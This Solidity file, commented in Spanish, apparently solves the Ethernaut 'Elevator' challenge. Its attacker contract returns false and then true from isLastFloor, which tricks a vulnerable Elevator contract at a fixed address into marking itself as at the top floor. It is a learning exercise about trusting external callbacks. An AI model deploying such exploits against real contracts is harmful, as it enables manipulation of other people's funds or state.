// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyBuilding {
    bool public firstFalse;

    Elevator ElevatorInstance =
        Elevator(0xcdF634FbB9ebBA0a7e7B11A81C53bd521DA262cE);

    /* _topLevel NO SE USA */
    function isLastFloor(uint _topLevel) external returns (bool) {
        if (!firstFalse) {
            firstFalse = true;
            return false;
        } else return true;
    }

    /* llamaremos esta funcion --> llamara al contrato Elevator y a su vez volvera a llamar a la funcion "isLastFloor" de este contrato */
    function callElevatorInstance() external {
        ElevatorInstance.goTo(10);
    }
}

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor; // 0

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            // debe ser FALSE
            floor = _floor;
            top = building.isLastFloor(floor); // debe ser TRUE
        }
    }
}
